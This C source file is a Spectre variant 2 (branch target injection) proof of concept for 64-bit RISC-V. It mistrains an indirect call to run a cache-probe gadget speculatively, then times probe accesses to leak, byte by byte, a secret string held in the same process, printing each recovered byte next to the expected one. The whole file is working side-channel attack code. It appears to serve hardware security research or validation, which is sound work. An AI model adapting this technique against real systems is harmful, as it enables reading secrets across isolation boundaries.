#include <stdio.h>
#include <stdint.h>
#include <string.h>

#include "rv64_spectre.h"

#ifndef V2_ATTACK_TRIES
#define V2_ATTACK_TRIES 128
#endif

#ifndef V2_TRAINING_LOOPS
#define V2_TRAINING_LOOPS 48
#endif

static uint8_t *channel;
static const char secret[] = "S3CreT";
static volatile uintptr_t target_value;

static __attribute__((noinline)) int gadget(char *addr)
{
  return channel[(size_t)(uint8_t)*addr * PROBE_STRIDE];
}

static __attribute__((noinline)) int safe_target(char *addr)
{
  return (int)(uintptr_t)addr & 1;
}

static __attribute__((noinline)) int victim(char *addr, int input)
{
  int junk = 0;
  for (int i = 1; i <= 64; ++i)
  {
    input += i;
    junk += input & i;
  }

  int (*fn)(char *) = (int (*)(char *))target_value;
  const int result = fn(addr);
  return result & junk;
}

static __attribute__((noinline)) void read_byte(char *addr_to_read, uint8_t result[2],
                                                uint64_t score[2], uint64_t threshold)
{
  uint64_t hits[PROBE_ENTRIES];
  memset(hits, 0, sizeof(hits));

  char dummy = '$';
  int junk = 0;

  for (int tries = V2_ATTACK_TRIES; tries > 0; --tries)
  {
    flush_range(channel, PROBE_BYTES);

    target_value = (uintptr_t)&gadget;
    fence_all();
    for (int j = V2_TRAINING_LOOPS; j > 0; --j)
      junk ^= victim(&dummy, 0);

    target_value = (uintptr_t)&safe_target;
    flush_line((const void *)&target_value);
    fence_all();

    junk ^= victim(addr_to_read, 0);

    for (size_t i = 0; i < PROBE_ENTRIES; ++i)
    {
      const size_t mix_i = probe_mix(i);
      volatile uint8_t *addr = &channel[mix_i * PROBE_STRIDE];
      const uint64_t elapsed = probe_time(addr);
      if (elapsed <= threshold)
        hits[mix_i]++;
    }

    uint8_t best[2];
    uint64_t best_score[2];
    top_two_idx(hits, PROBE_ENTRIES, best, best_score);
    if (best_score[0] >= (2u * best_score[1] + 5u) ||
        (best_score[0] == 2u && best_score[1] == 0u))
      break;
  }

  result[0] = 0;
  result[1] = 0;
  score[0] = 0;
  score[1] = 0;
  top_two_idx(hits, PROBE_ENTRIES, result, score);
  (void)junk;
}

int main(void)
{
  uint8_t result[2] = {0, 0};
  uint64_t score[2] = {0, 0};
  const size_t len = spectre_limit_len(sizeof(secret) - 1u);
  char *addr = (char *)secret;

  if (spectre_runtime_init() != 0)
    return 1;
  channel = (uint8_t *)spectre_alloc_aligned(PROBE_BYTES, L1_BLOCK_SZ_BYTES);
  if (channel == NULL)
    return 1;

  probe_init(channel);
  const uint64_t threshold = calibrate_probe_threshold(channel);

  printf("[v2] threshold: %lu\n", (unsigned long)threshold);
  printf("[v2] reading %lu bytes\n", (unsigned long)len);
  fflush(stdout);

  for (size_t i = 0; i < len; ++i)
  {
    read_byte(addr + i, result, score, threshold);
    printf("[v2] byte %2lu: %c (0x%02x) score=%lu\n",
           (unsigned long)i,
           (result[0] >= 32 && result[0] < 127) ? result[0] : '?',
           result[0],
           (unsigned long)score[0]);
    printf("[v2] expected: %c (0x%02x) second=%c (0x%02x) score=%lu\n",
           (secret[i] >= 32 && secret[i] < 127) ? secret[i] : '?',
           (uint8_t)secret[i],
           (result[1] >= 32 && result[1] < 127) ? result[1] : '?',
           result[1],
           (unsigned long)score[1]);
    printf("[v2] check %lu 0x%02x 0x%02x\n",
           (unsigned long)i,
           result[0],
           (uint8_t)secret[i]);
    fflush(stdout);
  }

  return 0;
}
